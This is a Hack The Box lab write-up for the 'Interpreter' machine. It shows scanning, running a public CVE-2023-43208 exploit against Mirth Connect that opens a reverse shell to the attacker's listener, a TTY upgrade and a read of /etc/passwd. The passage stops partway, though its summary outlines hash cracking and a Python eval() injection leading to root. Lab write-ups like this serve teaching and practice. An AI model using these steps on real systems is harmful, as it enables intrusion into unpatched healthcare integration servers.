---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - MirthConnect
  - CVE-2023-43208
  - RemoteCodeExecution
  - RCE
  - MariaDB
  - Hash
  - Cracking
  - hashcat
  - PBKDF2
  - PasswordReuse
  - Flask
  - PythonEvalInjection
  - CommandInjection
---

![](images/Interpreter.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Initial Access](#Initial-Access)
    - [CVE-2023-43208: Mirth Connect 4.4.0 Remote Code Execution (RCE)](#CVE-2023-43208-Mirth-Connect-440-Remote-Code-Execution-RCE)
- [Enumeration (mirth)](#Enumeration-mirth)
- [Privilege Escalation to sedric](#Privilege-Escalation-to-sedric)
    - [MariaDB Enumeration](#MariaDB-Enumeration)
    - [Cracking the Hash using hashcat](#Cracking-the-Hash-using-hashcat)
- [user.txt](#usertxt)
- [Enumeration (sedric)](#Enumeration-sedric)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [Python Eval Injection](#Python-Eval-Injection)
- [root.txt](#roottxt)

## Summary

The box starts with `SSH` on port `22/TCP` `HTTP` on port `80/TCP` `HTTPS` on port `443/TCP` and an unknown service on port `6661/TCP`. The web services run `Jetty` serving a `Mirth Connect Administrator` login interface. Examining the `webstart.jnlp` file reveals the installation is running `Mirth Connect` version `4.4.0`.

`Mirth Connect 4.4.0` is vulnerable to `CVE-2023-43208` which is an `Unauthenticated Remote Code Execution` (`RCE`) vulnerability. Exploiting this vulnerability using a proof of concept script grants initial access as the `mirth` user.

Enumeration of the `Mirth Connect` configuration reveals `MariaDB` database credentials stored in `mirth.properties`. Connecting to the database and enumerating the `PERSON_PASSWORD` table reveals a `PBKDF2-HMAC-SHA256` hash for the `sedric` user. Cracking the hash using `hashcat` yields the password `snowflake1` allowing `SSH` access as `sedric` and retrieval of `user.txt`.

For `Privilege Escalation` enumeration reveals a `Python Flask` application running as `root` on port `54321/TCP`. The application accepts `XML` patient data and uses Python's `eval()` function to format notifications creating a code injection vulnerability. Crafting a malicious `XML` payload that executes system commands through the `eval()` injection allows creating a `setuid` bash binary granting root access.

## Reconnaissance

### Port Scanning

We began with our initial port scan using `Nmap` which revealed `SSH` on port `22/TCP` `HTTP` on port `80/TCP` `HTTPS` on port `443/TCP` and an unknown service on port `6661/TCP`.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.129.2.86 --min-rate 10000
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-21 20:03 +0100
Nmap scan report for 10.129.2.86
Host is up (0.017s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
6661/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
```

Then we performed a service version scan on the discovered ports.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV  10.129.2.86          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-21 20:05 +0100
Nmap scan report for 10.129.2.86
Host is up (0.022s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http     Jetty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mirth Connect Administrator
443/tcp open  ssl/http Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.91 seconds
```

### Enumeration of Port 80/TCP

We accessed the web service and used `whatweb` to identify the technologies in use.

- [http://10.129.2.86/](http://10.129.2.86/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://10.129.2.86/                      
http://10.129.2.86 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.129.2.86], JQuery[3.5.1], Script[text/javascript], Title[Mirth Connect Administrator], X-UA-Compatible[IE=edge]
```

The website displayed a `Mirth Connect Administrator` login page.

![](images/2026-02-21_20-08_80_website.png)

Clicking on the `Launch Mirth Connect Administrator` button provided additional details about the installation.

![](images/2026-02-21_20-09_80_website_details.png)

By downloading the `webstart.jnlp` file we found important configuration details including the version number.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Interpreter/files]
└─$ cat webstart.jnlp 
<jnlp codebase="http://10.129.2.86:80" version="4.4.0">
    
    <information>
        
        <title>Mirth Connect Administrator 4.4.0</title>
        
        <vendor>NextGen Healthcare</vendor>
        
        <homepage href="http://www.nextgen.com"/>
        
        <description>Open Source Healthcare Integration Engine</description>
        

        <icon href="images/NG_MC_Icon_128x128.png"/>
        
        <icon href="images/MirthConnect_Logo_WordMark_Big.png" kind="splash"/>
         


        <offline-allowed/>
        
        <shortcut online="true">
                        
            <!-- put a shortcut on the desktop -->
                        
            <desktop/>
                        
            <!-- put shortcut in start menu too -->
                        
            <menu submenu="Mirth Connect"/>
                
        </shortcut>
            

    </information>
    

    <security>
        
        <all-permissions/>
        
    </security>
    

    <update check="timeout" policy="always"/>
    

    <resources>
        
        <j2se href="http://java.sun.com/products/autodl/j2se" java-vm-args="--add-modules=java.sql.rowset --add-exports=java.base/com.sun.crypto.provider=ALL-UNNAMED --add-exports=java.base/sun.security.provider=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED --add-opens=java.base/java.math=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.security=ALL-UNNAMED --add-opens=java.base/java.security.cert=ALL-UNNAMED --add-opens=java.base/java.text=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/sun.security.pkcs=ALL-UNNAMED --add-opens=java.base/sun.security.rsa=ALL-UNNAMED --add-opens=java.base/sun.security.x509=ALL-UNNAMED --add-opens=java.desktop/com.apple.eawt=ALL-UNNAMED --add-opens=java.desktop/com.apple.eio=ALL-UNNAMED --add-opens=java.desktop/java.awt=ALL-UNNAMED --add-opens=java.desktop/java.awt.color=ALL-UNNAMED --add-opens=java.desktop/java.awt.font=ALL-UNNAMED --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED" max-heap-size="512m" version="1.9+"/>
        
        <j2se href="http://java.sun.com/products/autodl/j2se" max-heap-size="512m" version="1.6+"/>
        
        <jar download="eager" href="webstart/client-lib/mirth-client.jar" main="true" sha256="IHeDHNaFglz/afA4Osr3nllnqCMpsgo6RmrVTjbKBsA="/>
        <jar download="eager" href="webstart/client-lib/mirth-client-core.jar" sha256="Ms8xCKJF4OPd0YHeM0I+dPyfKB4sdsXHcQsubFBfvz4="/>
        <jar download="eager" href="webstart/client-lib/mirth-crypto.jar" sha256="3QGDVXdCJU/pevR+R0wnBGKnI6Ffuigbt4xNw8IOJKM="/>
        <jar download="eager" href="webstart/client-lib/mirth-vocab.jar" sha256="C20/n2aTWZFxY4x8iEBcrLWGzz5taUMTlWLezAcpCRs="/>
        <jar download="eager" href="webstart/client-lib/commons-lang3-3.9.jar" sha256="Vgwgrwq6WiuqsbpFY2oAq3y8dYHTsrQXc7BT8d4Bjmg="/>
        <jar download="eager" href="webstart/client-lib/jackson-core-2.11.3.jar" sha256="Sn93THoyv2dXoxnx/FGS4YJgW0bWpBuzLPUo2S2fsWw="/>
        <jar download="eager" href="webstart/client-lib/language_support.jar" sha256="sAzNPDx8Zcc+miVKCivSPaJC3fSCwgPE7y/tWM6f48A="/>
        <jar download="eager" href="webstart/client-lib/donkey-model.jar" sha256="rUOeInGLuiIRKZpUgosD/5Jeitea+mMtVfy/WGS8B1Q="/>
        <jar download="eager" href="webstart/client-lib/commons-configuration2-2.7.jar" sha256="QcDVizhsNICZPRi4XT7K+hBgm9KNFdRPLetbna1te80="/>
        <jar download="eager" href="webstart/client-lib/commons-codec-1.13.jar" sha256="rqMdWtimh21sVB/oZf/qwut33nVpNeXVPm74vfuVmKY="/>
        <jar download="eager" href="webstart/client-lib/jetty-util-9.4.44.v20210927.jar" sha256="FwOCGovjairWKH7Rg7r1knTLOnid4R9I0M0EbsjNJ7s="/>
        <jar download="eager" href="webstart/client-lib/log4j-1.2-api-2.17.2.jar" sha256="4Gi6JmmLeoPW/o6DYZMFl8zZoyZIHZ//sPJP27A7AVY="/>
        <jar download="eager" href="webstart/client-lib/javax.annotation-api-1.3.jar" sha256="B9B2My7V8CSIJT6+VqrdC2qTKlHBi5VQtNEcFTDdiI8="/>
        <jar download="eager" href="webstart/client-lib/hk2-locator-2.4.0-b31.jar" sha256="OTY93Favv8bFowgge5fv/nizGE2Vhp7IATYrVwNs6wI="/>
        <jar download="eager" href="webstart/client-lib/velocity-tools-generic-3.0.jar" sha256="ItFZhaj2pSWqreMV0hiT2hpN9Es6wxznasfNlgwomEY="/>
        <jar download="eager" href="webstart/client-lib/mimepull-1.9.7.jar" sha256="IR3nxpVPJFHkB7rqiX14vBJbeg3kLStX30X9XiIgh98="/>
        <jar download="eager" href="webstart/client-lib/zip4j_1.3.3.jar" sha256="Nq0nH85RbGL9D3KOlo1UIciuuhJo75yL4CpSakYXRn0="/>
        <jar download="eager" href="webstart/client-lib/commons-io-2.6.jar" sha256="ETnAc6KUHMebRMv0FKWTlUF7Et8vHlMw3uagiYOQlag="/>
        <jar download="eager" href="webstart/client-lib/commons-collections4-4.4.jar" sha256="nW5g92kH9CucRW1+B3OI4oTvsICWwwd/7hkkbMFdIWc="/>
        <jar download="eager" href="webstart/client-lib/rsyntaxtextarea-2.5.6.jar" sha256="5AwU0m/gEfep5vsTDox3h+iFRielROm8Ee3aD6vTKTQ="/>
        <jar download="eager" href="webstart/client-lib/quartz-all-2.1.7.jar" sha256="s8iEI5/GpBxXvE6bF76gPuzeIsc6H/+6ybO7RIDPxGI="/>
        <jar download="eager" href="webstart/client-lib/commons-text-1.10.0.jar" sha256="mkbZGbj6rJ+DfxfzXg9K71+fjTzg5fKS4q+5hKE6FXY="/>
        <jar download="eager" href="webstart/client-lib/autocomplete-2.5.4.jar" sha256="e4ZfCl5M9ElresOdHO30kzKqv79SxvpW3hWyxsVEK3w="/>
        <jar download="eager" href="webstart/client-lib/utils-2.15.28.jar" sha256="F2h3NoUjlAcsMb7Tzr/1SnHQDE3jLNnk/94nym9ERV4="/>
        <jar download="eager" href="webstart/client-lib/xpp3-1.1.4c.jar" sha256="sRmgN+Q81MVgJ+0eJaPPWatm39tYtHFRx6XxgvtLkec="/>
        <jar download="eager" href="webstart/client-lib/libphonenumber-8.12.50.jar" sha256="tjWFlc1nGTCQKOUgi/w7sWHGmTpeoerafoRZeOM4Q5o="/>
        <jar download="eager" href="webstart/client-lib/log4j-core-2.17.2.jar" sha256="fylUDk4s8265Vk+Y/jvkLsW8x8e5VjJUjTS1v8VEkrs="/>
        <jar download="eager" href="webstart/client-lib/jersey-proxy-client-2.22.1.jar" sha256="kCMvyNtvYX9sgjMt5OnZ2gJ163vYkDhLYoV/xpUs3Co="/>
        <jar download="eager" href="webstart/client-lib/commons-vfs2-2.1.jar" sha256="AeG82Lit+p/45dInSR8cxRZ8Eb2LmIQelpPHRGEG3Fg="/>
        <jar download="eager" href="webstart/client-lib/commons-logging-1.2.jar" sha256="KBnbQ2TXK5shS9/peQgDFVll50w6kAMfBVzKVTgfMV4="/>
        <jar download="eager" href="webstart/client-lib/swagger-annotations-2.0.10.jar" sha256="obRzCEphaiLShGrWm3d1fEGpKaTwmsAN7RVwNpc4ybg="/>
        <jar download="eager" href="webstart/client-lib/xstream-1.4.19.jar" sha256="An1TfdUt/dyRZWO1O4L3OB8/I2JYJnHX/7u7e07lrfs="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v28-2.3.jar" sha256="LIlghnHInyIiHFipUqQEqo3w3/JHwBbVXKNhtH3vSpw="/>
        <jar download="eager" href="webstart/client-lib/looks-2.3.1.jar" sha256="YAGKqTQk1/doNoOzJ1me0F2OBO7bRAEa052xk2Y4Qxc="/>
        <jar download="eager" href="webstart/client-lib/jaxb-runtime-2.4.0-b180725.0644.jar" sha256="p+osvQhxLrgqF4woPOlD78SuhWAGS74O3nGOq2lsYt8="/>
        <jar download="eager" href="webstart/client-lib/jcifs-ng-2.1.8.jar" sha256="1LMOZ6bPn/yHjkrqho3k+KVvs0hCENbK4sh0lA7AefE="/>
        <jar download="eager" href="webstart/client-lib/swingx-core-1.6.2.jar" sha256="Krugs5yfMGY+hJP2YtVjQzk2fEBIDqKNL+Mpc0zs93E="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v23-2.3.jar" sha256="JlCBJVERFzAiyp4INZU5rdaQqHJRzlusNXYxwvVbNgA="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v21-2.3.jar" sha256="SWz11YnwDV8se0huhvnwPbSN3zb+52VnIXrCbxj71os="/>
        <jar download="eager" href="webstart/client-lib/bcutil-jdk18on-171.jar" sha256="/jd5If5JVbQraUTgVMUDOsziWVrAdupKbC2YtCaBEYU="/>
        <jar download="eager" href="webstart/client-lib/openjfx.jar" sha256="xXKQTb9rtpA+xbbrJv41SeGQsfBLK5od/tjYzSBEfqI="/>
        <jar download="eager" href="webstart/client-lib/hapi-base-2.3.jar" sha256="XgloOIjOa0PPHD6YRCtQYz8Sh1wOXd4qZwT8rP0NH2g="/>
        <jar download="eager" href="webstart/client-lib/jersey-media-multipart-2.22.1.jar" sha256="NI9cZ1099RlbB1UDeDeqxG+JDk1XL/5QpulQF76VM0E="/>
        <jar download="eager" href="webstart/client-lib/httpcore-4.4.13.jar" sha256="7GMATM3FXKnnKJokElaJxSUznUY4lI0nbKKo+XW/Amk="/>
        <jar download="eager" href="webstart/client-lib/xercesImpl-2.9.1.jar" sha256="35zfeAILzwjhdB7CmbVNu/IgqdWm92le919CD0vT3Go="/>
        <jar download="eager" href="webstart/client-lib/javax.activation-1.2.0.jar" sha256="rV9iEYBiiE0cU0+2Dd3Mqihmk/ykGK62+YGf/7Hmofo="/>
        <jar download="eager" href="webstart/client-lib/hk2-api-2.4.0-b31.jar" sha256="Yd0V2fCUvbtCeWsKybYe52IiKr0pcWUXYG2r1qRCKVo="/>
        <jar download="eager" href="webstart/client-lib/commons-compress-1.17.jar" sha256="vdHWwrCXRfPZawbulPFXxx/9elZghqPNsYD9Sq/EiRU="/>
        <jar download="eager" href="webstart/client-lib/staxon-1.3.jar" sha256="jeWRqRwl0xXZzYCV4hHI9L8Ce/sy9mNVsg1LmzrcH0w="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v231-2.3.jar" sha256="Zy3A3/aqpUxulbTzSLOfFS/zskDaRtHqcyktQ9Ppl8U="/>
        <jar download="eager" href="webstart/client-lib/jackson-databind-2.11.3.jar" sha256="HdpB6UnUciJ4xp3AApqF3SD0DC7XceIsoqy+nvtRO/k="/>
        <jar download="eager" href="webstart/client-lib/jersey-guava-2.22.1.jar" sha256="IBqA2V9KW8RRbGf1gi83X1yPbPevBUWvSvSLAsBT/+8="/>
        <jar download="eager" href="webstart/client-lib/joda-time-2.9.9.jar" sha256="lbeoqEup9KalPvZCzypvbbIkaIWi2jlKfSpHlQIt1rw="/>
        <jar download="eager" href="webstart/client-lib/velocity-engine-core-2.2.jar" sha256="hLoIAPaQME4UpUhH4JM/BaRE1XU/aAsKWpO/a7QtlqM="/>
        <jar download="eager" href="webstart/client-lib/javax.inject-2.4.0-b31.jar" sha256="VMorIrzeWoo+lDm5JOnVK0w4Cshu5wEmVgjP6lkqqDw="/>
        <jar download="eager" href="webstart/client-lib/jackson-annotations-2.11.3.jar" sha256="DoOzxry+xCjH7dTFsmeOBqnf6tp/MADddqPAc74EbAw="/>
        <jar download="eager" href="webstart/client-lib/slf4j-api-1.7.30.jar" sha256="4odF1co8Wo88h4Pmg/GzGh2SKMnnn0Yi04e0Og0Rg6o="/>
        <jar download="eager" href="webstart/client-lib/commons-pool2-2.3.jar" sha256="APdgYnfApxJ1KQ+FlfuLhcSYL1J+YfM2gWQG52hhogQ="/>
        <jar download="eager" href="webstart/client-lib/javassist-3.26.0-GA.jar" sha256="CIYZWNSYwYzGL6Br67AC6i0neHBvi2JOpCjRjmJGFI0="/>
        <jar download="eager" href="webstart/client-lib/guava-28.2-jre.jar" sha256="SyoNyKpmdiFudyjFaul5lMleraSD8E85voyrCpzf9dY="/>
        <jar download="eager" href="webstart/client-lib/jaxb-api-2.4.0-b180725.0427.jar" sha256="l9sDNL727nZkvNzCarcpq7jd8VcMu3ss6FNOSG57/NQ="/>
        <jar download="eager" href="webstart/client-lib/httpmime-4.5.13.jar" sha256="7R/v9tFfvVFBimz7msrZ1B6Zfq5bGQqFDkyYFterJMM="/>
        <jar download="eager" href="webstart/client-lib/wizard.jar" sha256="7OYEhgqNU7QJqK9bHGJNJqxFCi4oWVlF8XtYwBaPdOo="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v22-2.3.jar" sha256="OjQVkkOwGi+iGVkPv9q06zuiHw6ER+iUMlZJJHc35ZA="/>
        <jar download="eager" href="webstart/client-lib/miglayout-swing-4.2.jar" sha256="Mx8CMy2FiaUHSLJB4nSirw4XWrQiuzZuHbTK385bnIk="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v25-2.3.jar" sha256="9SblQqKV9egD7z7obYD6BnY/nTXvli5+uPkLYDvsYAs="/>
        <jar download="eager" href="webstart/client-lib/reflections-0.9.10.jar" sha256="IPDk2Q6OmWaPvh4hRXVM0PYCrWryNVd0aaiufWFahNk="/>
        <jar download="eager" href="webstart/client-lib/javaparser-1.0.8.jar" sha256="cUyZFy6pW06C7BeXIVnQH1jSDjn+D6NOvFLdxZm0v3U="/>
        <jar download="eager" href="webstart/client-lib/miglayout-core-4.2.jar" sha256="0ajHMEw8GsCWLq1gSh9zhJp+FRGHhq//sRO2RTz9EtU="/>
        <jar download="eager" href="webstart/client-lib/bcprov-ext-jdk18on-171.jar" sha256="/1v9cPkedM2dS61zfPb1QRczEb2XjDx8IxQ+vX3EgqM="/>
        <jar download="eager" href="webstart/client-lib/jersey-common-2.22.1.jar" sha256="w1a3DUxOzMnN3ShUe3BgqKq+LQZuRXbjf7XPGAGSyH4="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v26-2.3.jar" sha256="/sdcfbvvni4u7iJ7C4fAoGuqBV3SKt+oaeaUmrz7soc="/>
        <jar download="eager" href="webstart/client-lib/javax.ws.rs-api-2.0.1.jar" sha256="1anYrmLH6XVLuL6UdyHChnVC63G88ZN6ksYVKDHrwWY="/>
        <jar download="eager" href="webstart/client-lib/rhino-1.7.13.jar" sha256="9YLjcaeQjbLFrlnNeNAPPFyO7GwkWeoivlB+cHf/LGw="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v251-2.3.jar" sha256="PKc8cQQrOWODAnNyWfbj0YGGoZlR2+ekBnToOn9XIp4="/>
        <jar download="eager" href="webstart/client-lib/bcpkix-jdk18on-171.jar" sha256="skuBILkn+PcpJuDP/M9di3Nu3hlq93rYuSSgS2/ovtQ="/>
        <jar download="eager" href="webstart/client-lib/javax.mail-1.5.0.jar" sha256="flDlXMAW8Rl7/D5PRT6aziJ5+BFLgCkly4USmIUJnj0="/>
        <jar download="eager" href="webstart/client-lib/slf4j-log4j12-1.7.30.jar" sha256="7G71CIScs6JqQn95E5IH01sMkDdrP/BDQgCS9ZwmIvE="/>
        <jar download="eager" href="webstart/client-lib/jai_imageio.jar" sha256="Sv+7VsN2v7lCseg/10Hfl+25Z17DIjbBFS5LW8uSCzc="/>
        <jar download="eager" href="webstart/client-lib/javax.activation-api-1.2.0.jar" sha256="v3ndkHoaiEwiTJpm9177HFQztgaZC5VfN9B2jdrkhFs="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v27-2.3.jar" sha256="fJ668/E7otWgs7SA1jHiiCpKHSHAiouVPKS3IO1Zcq4="/>
        <jar download="eager" href="webstart/client-lib/userutil-sources.jar" sha256="1BGr/v2Og/FH2XYS244rEs7fsLEu1BmKQmSpWHRn05U="/>
        <jar download="eager" href="webstart/client-lib/bcprov-jdk18on-171.jar" sha256="l7kndUKXP0Boq6mlKee5Qo78WjkJEH2nDYp/+PbhVkI="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v281-2.3.jar" sha256="4s3VMiZqi8XRR8R2ojsgD9sALwtqw4wnSRa0d0YxYtU="/>
        <jar download="eager" href="webstart/client-lib/jersey-client-2.22.1.jar" sha256="gmAUfqtAN3AeddIKF40h1pvUB10Qzdy3+Z6zWKXueTY="/>
        <jar download="eager" href="webstart/client-lib/log4j-api-2.17.2.jar" sha256="Rpvu+JLDk4rkoNnRr8C9xI57yHVBwTB0tvAL8zSi5cY="/>
        <jar download="eager" href="webstart/client-lib/httpclient-4.5.13.jar" sha256="G87KYCKVy/05s9g44w8cILxtugjhab6FyoM24Xcov9M="/>
        <jar download="eager" href="webstart/client-lib/istack-commons-runtime-3.0.6.jar" sha256="r7Pdb2yYKzY3TR1m8Nq8nR52JTeX9WjlGYZWwvQQMrU="/>
        <jar download="eager" href="webstart/client-lib/hapi-structures-v24-2.3.jar" sha256="m6ulzJ/p9GGit/n3kid3O2VDZSSGdSgzltNd1UVGFuw="/>
        <jar download="eager" href="webstart/client-lib/commons-lang-2.6.jar" sha256="NKmzkdAArMvPlzkusZAE3/wiKSk1XsdzJONkUQvG8dk="/>
        <jar download="eager" href="webstart/client-lib/commons-beanutils-1.9.3.jar" sha256="rpgEMWYeRxs6wfLVCeOCrgm2CWo+QdSNPxLK05zWz9k="/>
        <jar download="eager" href="webstart/client-lib/regions-2.15.28.jar" sha256="DO+3VI3z+GW/FSgxHWsjJ6ddn3FedIBCeRkdvjUSWc0="/>
        <jar download="eager" href="webstart/client-lib/hk2-utils-2.4.0-b31.jar" sha256="1dSEKIqf2Ocip0f+5elBZJxi6UnRoaLg5RsfdzNluTI="/>
        <extension href="webstart/extensions/scriptfilestep.jnlp"/>
        <extension href="webstart/extensions/textviewer.jnlp"/>
        <extension href="webstart/extensions/dicomviewer.jnlp"/>
        <extension href="webstart/extensions/js.jnlp"/>
        <extension href="webstart/extensions/jdbc.jnlp"/>
        <extension href="webstart/extensions/mapper.jnlp"/>
        <extension href="webstart/extensions/directoryresource.jnlp"/>
        <extension href="webstart/extensions/datapruner.jnlp"/>
        <extension href="webstart/extensions/javascriptrule.jnlp"/>
        <extension href="webstart/extensions/datatype-xml.jnlp"/>
        <extension href="webstart/extensions/datatype-ncpdp.jnlp"/>
        <extension href="webstart/extensions/jms.jnlp"/>
        <extension href="webstart/extensions/datatype-json.jnlp"/>
        <extension href="webstart/extensions/xsltstep.jnlp"/>
        <extension href="webstart/extensions/file.jnlp"/>
        <extension href="webstart/extensions/scriptfilerule.jnlp"/>
        <extension href="webstart/extensions/messagebuilder.jnlp"/>
        <extension href="webstart/extensions/datatype-dicom.jnlp"/>
        <extension href="webstart/extensions/serverlog.jnlp"/>
        <extension href="webstart/extensions/datatype-hl7v3.jnlp"/>
        <extension href="webstart/extensions/datatype-hl7v2.jnlp"/>
        <extension href="webstart/extensions/ws.jnlp"/>
        <extension href="webstart/extensions/javascriptstep.jnlp"/>
        <extension href="webstart/extensions/dashboardstatus.jnlp"/>
        <extension href="webstart/extensions/datatype-raw.jnlp"/>
        <extension href="webstart/extensions/tcp.jnlp"/>
        <extension href="webstart/extensions/datatype-edi.jnlp"/>
        <extension href="webstart/extensions/smtp.jnlp"/>
        <extension href="webstart/extensions/globalmapviewer.jnlp"/>
        <extension href="webstart/extensions/httpauth.jnlp"/>
        <extension href="webstart/extensions/dicom.jnlp"/>
        <extension href="webstart/extensions/imageviewer.jnlp"/>
        <extension href="webstart/extensions/mllpmode.jnlp"/>
        <extension href="webstart/extensions/pdfviewer.jnlp"/>
        <extension href="webstart/extensions/destinationsetfilter.jnlp"/>
        <extension href="webstart/extensions/vm.jnlp"/>
        <extension href="webstart/extensions/http.jnlp"/>
        <extension href="webstart/extensions/doc.jnlp"/>
        <extension href="webstart/extensions/rulebuilder.jnlp"/>
        <extension href="webstart/extensions/datatype-delimited.jnlp"/>
    </resources>
    

    <application-desc main-class="com.mirth.connect.client.ui.Mirth">
        <argument>https://10.129.2.86:443</argument>
        <argument>4.4.0</argument>
    </application-desc>
    
</jnlp>
```

| Version |
| ------- |
| 4.4.0   |

Additionally there was a login form too but it had no use as we figured out later.

![](images/2026-02-21_20-11_80_website_login.png)

## Initial Access

### CVE-2023-43208: Mirth Connect 4.4.0 Remote Code Execution (RCE)

Based on the identified version `4.4.0` research revealed that `Mirth Connect` is vulnerable to `CVE-2023-43208` aka `Mirth Connect Unauthenticated Remote Code Execution` (`RCE`).

- [https://medium.com/@rahulravi.hulli/enumerating-the-rce-vulnerability-on-mirth-connect-4-4-0-24424258a3b5](https://medium.com/@rahulravi.hulli/enumerating-the-rce-vulnerability-on-mirth-connect-4-4-0-24424258a3b5)
- [https://horizon3.ai/attack-research/attack-blogs/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/](https://horizon3.ai/attack-research/attack-blogs/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/
- [https://nvd.nist.gov/vuln/detail/cve-2023-43208]()https://nvd.nist.gov/vuln/detail/cve-2023-43208)
- [https://github.com/gotr00t0day/NextGen-Mirth-Connect-Exploit](https://github.com/gotr00t0day/NextGen-Mirth-Connect-Exploit)

We obtained a proof of concept exploit from GitHub and executed it against the target.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Interpreter/files/NextGen-Mirth-Connect-Exploit]
└─$ python3 mirthconnect_exploit.py -t 10.129.2.86 -p 443 -lh 10.10.16.69 -lp 4444 --exploit



   _____  .__         __  .__      __________      _________                                                                                                                                                       
  /     \ |__|_______/  |_|  |__   \______   \____ \_   ___ \                                                                                                                                                      
 /  \ /  \|  \_  __ \   __\  |  \   |     ___/  _ \/    \  \/                                                                                                                                                      
/    Y    \  ||  | \/|  | |   Y  \  |    |  (  <_> )     \____                                                                                                                                                     
\____|__  /__||__|   |__| |___|  /  |____|   \____/ \______  /                                                                                                                                                     
        \/                     \/                          \/                                                                                                                                                      
                                                                                                                                                                                                                   
Author: c0deninja                                                                                                                                                                                                  
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   


[+] Found Mirth Connect Administrator:  https://10.129.2.86 4.4.0

Exploit launched......

Check your reverse shell at 10.10.16.69 4444!!!

```

Almost immediately a reverse shell connection came through.

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.69] from (UNKNOWN) [10.129.2.86] 60754
```

As usual we upgraded the shell to a fully interactive TTY.

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
mirth@interpreter:/usr/local/mirthconnect$ ^Z
zsh: suspended  nc -lnvp 4444
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 4444

mirth@interpreter:/usr/local/mirthconnect$ 
mirth@interpreter:/usr/local/mirthconnect$ export XTERM=xterm 
mirth@interpreter:/usr/local/mirthconnect$
```

## Enumeration (mirth)

Now it was time for the standard enumeration routine starting with basic user context checks.

```shell
mirth@interpreter:/usr/local/mirthconnect$ id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

Looking through `/etc/passwd` revealed a potential target user.

```shell
mirth@interpreter:/usr/local/mirthconnect$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash
